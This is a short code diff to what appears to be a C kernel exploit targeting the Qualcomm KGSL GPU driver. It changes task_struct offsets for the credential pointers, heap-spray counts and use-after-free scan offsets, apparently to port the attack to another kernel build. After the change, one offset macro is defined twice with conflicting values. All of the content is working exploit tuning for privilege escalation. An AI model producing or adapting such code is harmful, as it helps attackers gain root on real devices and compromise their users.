@@ -30,9 +30,9 @@
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
 #define OFFSET_COMM          0x818
-#define OFFSET_MARKER        0x818
-#define OFFSET_CRED          0x6b0
-#define OFFSET_REAL_CRED     0x6b8
+#define OFFSET_COMM          0x428
+#define OFFSET_CRED          0x2c0
+#define OFFSET_REAL_CRED     0x2c8
 #define OFFSET_TASKS         0x3f0
 #define OFFSET_FLAGS         0x00
 #define OFFSET_STACK         0x08
@@ -125,9 +125,9 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 
 #define KGSL_IOC_TYPE 0x09
 #define FINDING 10
-#define SPRAY_COUNT 6000
-#define SPRAY_COUNT_STEP 1000
-#define SPRAY_COUNT_MAX 6000
+#define SPRAY_COUNT 5500
+#define SPRAY_COUNT_STEP 500
+#define SPRAY_COUNT_MAX 5500
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -1712,7 +1712,7 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
     fflush(stderr);
 
     uint64_t uaf_base_offsets[] = {
-        0x0, 0x800, 0x400, 0xc00, 0x200, 0xa00, 0x600, 0xe00,
+        0x780, 0x0, 0x800, 0x400, 0xc00, 0x200, 0xa00, 0x600, 0xe00,
         0x100, 0x300, 0x500, 0x700, 0x900, 0xb00, 0xd00, 0xf00,
         0x080, 0x180, 0x280, 0x380, 0x480, 0x580, 0x680, 0x780,
         0x880, 0x980, 0xa80, 0xb80, 0xc80, 0xd80, 0xe80, 0xf80};
